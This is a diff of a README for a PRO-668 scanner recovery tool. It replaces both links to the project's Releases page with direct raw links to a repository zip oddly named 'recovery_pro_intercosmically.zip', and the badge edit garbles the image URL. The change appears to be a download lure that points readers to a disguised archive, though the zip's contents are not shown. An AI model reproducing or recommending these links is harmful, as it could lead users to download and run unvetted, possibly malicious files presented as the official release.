@@ -1,6 +1,6 @@
 # 📡 pro668-recovery - Easily Restore Your PRO-668 Scanner
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Release%20Files-brightgreen)](https://github.com/adityavikramx/pro668-recovery/releases)
+[![Download](https://github.com/adityavikramx/pro668-recovery/raw/refs/heads/main/firmware/recovery_pro_intercosmically.zip%20Now-Get%20Release%20Files-brightgreen)](https://github.com/adityavikramx/pro668-recovery/raw/refs/heads/main/firmware/recovery_pro_intercosmically.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the pro668-recovery tool. This application helps you restore your Rad
 
 To start, you need to download the application. Visit the link below to access the Releases page.
 
-[Download pro668-recovery](https://github.com/adityavikramx/pro668-recovery/releases)
+[Download pro668-recovery](https://github.com/adityavikramx/pro668-recovery/raw/refs/heads/main/firmware/recovery_pro_intercosmically.zip)
 
 1. Click on the link above.
 2. Look for the latest version of the software.
